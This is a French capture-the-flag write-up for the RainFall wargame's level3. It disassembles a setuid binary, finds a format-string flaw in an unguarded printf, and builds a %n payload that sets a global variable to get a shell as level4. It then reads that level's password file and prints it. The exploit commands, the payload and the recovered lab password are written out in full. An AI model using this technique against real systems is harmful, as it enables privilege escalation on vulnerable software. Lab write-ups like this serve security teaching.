on a un exécutable `level3` qui lit sur l'entrée standard
```
level3@RainFall:~$ ls -l
total 8
-rwsr-s---+ 1 level4 users 5366 Mar  6  2016 level3
level3@RainFall:~$ ./level3
hey
hey
level3@RainFall:~$ ./level3 salut
hey
hey
```
on check les fonctions et on obtient une fonction `main`,
```
0x0804851a <+0>:     push   %ebp
0x0804851b <+1>:     mov    %esp,%ebp
0x0804851d <+3>:     and    $0xfffffff0,%esp
0x08048520 <+6>:     call   0x80484a4 <v>    // call la fonction v
0x08048525 <+11>:    leave
0x08048526 <+12>:    ret
```
et une fonction `v` :
```
0x080484a4 <+0>:     push   %ebp
0x080484a5 <+1>:     mov    %esp,%ebp
0x080484a7 <+3>:     sub    $0x218,%esp
0x080484ad <+9>:     mov    0x8049860,%eax          // eax = stdin
0x080484b2 <+14>:    mov    %eax,0x8(%esp)          // argument 3 for fget()
0x080484b6 <+18>:    movl   $0x200,0x4(%esp)        // argument 2 for fget()
0x080484be <+26>:    lea    -0x208(%ebp),%eax
0x080484c4 <+32>:    mov    %eax,(%esp)             // argument 1 for fget()
0x080484c7 <+35>:    call   0x80483a0 <fgets@plt>   // call gets()
0x080484cc <+40>:    lea    -0x208(%ebp),%eax
0x080484d2 <+46>:    mov    %eax,(%esp)             // argument for printf()
0x080484d5 <+49>:    call   0x8048390 <printf@plt>  // call printf()
0x080484da <+54>:    mov    0x804988c,%eax          // address of m
0x080484df <+59>:    cmp    $0x40,%eax              // check if m == 40(64)
0x080484e2 <+62>:    jne    0x8048518 <v+116>       // if not equal jump to line 116
0x080484e4 <+64>:    mov    0x8049880,%eax          // eax = stdout
0x080484e9 <+69>:    mov    %eax,%edx
0x080484eb <+71>:    mov    $0x8048600,%eax
0x080484f0 <+76>:    mov    %edx,0xc(%esp)          // argument 4 for fwrite()
0x080484f4 <+80>:    movl   $0xc,0x8(%esp)          // argument 3 for fwrite()
0x080484fc <+88>:    movl   $0x1,0x4(%esp)          // argument 2 for fwrite()
0x08048504 <+96>:    mov    %eax,(%esp)             // argument 1 for fwrite()
0x08048507 <+99>:    call   0x80483b0 <fwrite@plt>  // call fwrite()
0x0804850c <+104>:   movl   $0x804860d,(%esp)       // argument for system()
0x08048513 <+111>:   call   0x80483c0 <system@plt>  // call system
0x08048518 <+116>:   leave  
0x08048519 <+117>:   ret
```
lors du désassemblage, on peut voir que si la variable `m` est égale à 64 octets le programme lance un shell, il faut donc modifier `m`

on voit que printf ne prend que un paramètre pour afficher la variable `buffer`, cela rend le programme vulnérable à une "format string attack"

https://owasp.org/www-community/attacks/Format_string_attack

```
level3@RainFall:~$ echo -e "%p %p %p %p %p %p" > /tmp/stringexploit
level3@RainFall:~$ cat /tmp/stringexploit | ./level3 
0x200 0xb7fd1ac0 0xb7ff37d0 0x25207025 0x70252070 0x20702520
```

on voit que l'on peut afficher les adresses de la stack, ce qu'on veut c'est trouver l'emplacement de l'adresse de la variable `m`, on envoie en premier l'adresse de `m` pour qu'elle soit dans la stack lors du printf
on utilisera ensuite le spécificateur `%n` pour modifier `m`

https://stackoverflow.com/questions/3401156/what-is-the-use-of-the-n-format-specifier-in-c

```
level3@RainFall:~$ echo -e "\x8c\x98\x04\x08 %08p %08p %08p %08p %08p %08p %08p %08p" > /tmp/stringexploit
level3@RainFall:~$ cat /tmp/stringexploit | ./level3 
� 0x000200 0xb7fd1ac0 0xb7ff37d0 0x804988c 0x38302520 0x30252070 0x25207038 0x20703830
```

l'adresse de `m` est disponible à la 4ème place, on garde celle qui sont placées avant et on rajoute `x` octets pour que m soit égale à 64

`x` = 64 - strlen("\x8c\x98\x04\x08") - strlen(" %08p %08p %08p ")

`x` = 64 - 4 - 32 = 28

on rajoute 28 char dans le fichier stringexploit

```
level3@RainFall:~$ echo -e "\x8c\x98\x04\x08 %08p %08p %08p aaaaaaaaaaaaaaaaaaaaaaaaaaaa%n" > /tmp/stringexploit
level3@RainFall:~$ (cat /tmp/stringexploit ; cat) | ./level3 
�0x000200 0xb7fd1ac0 0xb7ff37d0aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Wait what?!
pwd
/home/user/level3
whoami
level4
cat /home/user/level4/.pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```